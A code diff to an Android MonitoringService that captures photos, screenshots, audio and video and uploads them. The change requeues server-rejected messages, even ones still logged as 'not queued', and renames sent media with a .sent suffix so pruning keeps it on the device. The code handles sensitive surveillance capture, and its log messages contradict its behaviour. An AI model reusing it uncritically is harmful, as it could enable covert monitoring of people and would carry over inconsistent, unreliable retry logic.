@@ -3421,14 +3421,22 @@ class MonitoringService : Service() {
                                 noteDroppedMessage()
                             } catch (_: Exception) {
                             }
-                            return true
+                            if (queueOnFail) {
+                                messageQueue.addMessage(plain)
+                                MessageScheduler.scheduleMessageSend(this)
+                            }
+                            return false
                         } else {
                             android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
                             try {
                                 noteDroppedMessage()
                             } catch (_: Exception) {
                             }
-                            return true
+                            if (queueOnFail) {
+                                messageQueue.addMessage(plain)
+                                MessageScheduler.scheduleMessageSend(this)
+                            }
+                            return false
                         }
                     } catch (_: Exception) {
                         if (queueOnFail) {
@@ -3443,7 +3451,11 @@ class MonitoringService : Service() {
                         noteDroppedMessage()
                     } catch (_: Exception) {
                     }
-                    return true
+                    if (queueOnFail) {
+                        messageQueue.addMessage(plain)
+                        MessageScheduler.scheduleMessageSend(this)
+                    }
+                    return false
                 }
             } else {
                 android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
@@ -5599,6 +5611,11 @@ private suspend fun ringDevice(seconds: Int) {
                 if (videoOutcome == MediaSendOutcome.KEPT) break
                 videoProgress = true
                 if (videoOutcome == MediaSendOutcome.DROPPED) droppedVideos++
+                else if (videoOutcome == MediaSendOutcome.SENT) {
+                    // rename to .sent so prune won't delete it
+                    val sentFile = File(file.absolutePath + ".sent")
+                    try { file.renameTo(sentFile) } catch (_: Exception) { }
+                }
                 kotlinx.coroutines.delay(500)
             }
             if (droppedVideos > 0) {
@@ -5617,7 +5634,7 @@ private suspend fun ringDevice(seconds: Int) {
     private fun pruneVideoCache(maxKept: Int) {
         try {
             val files = cacheDir.listFiles { file ->
-                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
+                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4") && !file.name.endsWith(".sent")
             }?.sortedBy { it.lastModified() }?.filter { it != activeVideoFile } ?: return
             val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
@@ -5658,6 +5675,11 @@ private suspend fun ringDevice(seconds: Int) {
                 if (audioOutcome == MediaSendOutcome.KEPT) break
                 audioProgress = true
                 if (audioOutcome == MediaSendOutcome.DROPPED) droppedAudio++
+                else if (audioOutcome == MediaSendOutcome.SENT) {
+                    // rename to .sent so prune won't delete it
+                    val sentFile = File(file.absolutePath + ".sent")
+                    try { file.renameTo(sentFile) } catch (_: Exception) { }
+                }
                 kotlinx.coroutines.delay(500)
             }
             if (droppedAudio > 0) {
@@ -5676,7 +5698,7 @@ private suspend fun ringDevice(seconds: Int) {
     private fun pruneAudioCache(maxKept: Int) {
         try {
             val files = cacheDir.listFiles { file ->
-                file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
+                file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a") && !file.name.endsWith(".sent")
             }?.sortedBy { it.lastModified() }?.filter { it != activeAudioFile } ?: return
             val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
@@ -5959,6 +5981,11 @@ private suspend fun ringDevice(seconds: Int) {
                 if (photoOutcome == MediaSendOutcome.KEPT) break
                 photoProgress = true
                 if (photoOutcome == MediaSendOutcome.DROPPED) droppedPhotos++
+                else if (photoOutcome == MediaSendOutcome.SENT) {
+                    // rename to .sent so prune won't delete it
+                    val sentFile = File(file.absolutePath + ".sent")
+                    try { file.renameTo(sentFile) } catch (_: Exception) { }
+                }
                 kotlinx.coroutines.delay(500)
             }
             if (droppedPhotos > 0) {
@@ -5989,7 +6016,7 @@ private suspend fun ringDevice(seconds: Int) {
             } catch (_: Exception) {
             }
             val photos = cacheDir.listFiles { file ->
-                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
+                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") && !file.name.endsWith(".sent")
             }?.sortedBy { it.lastModified() }?.filter { it != activePhotoFile && it != activeShotFile } ?: return
             val dropped = photos.dropLast(maxKept)
             if (dropped.isEmpty()) return
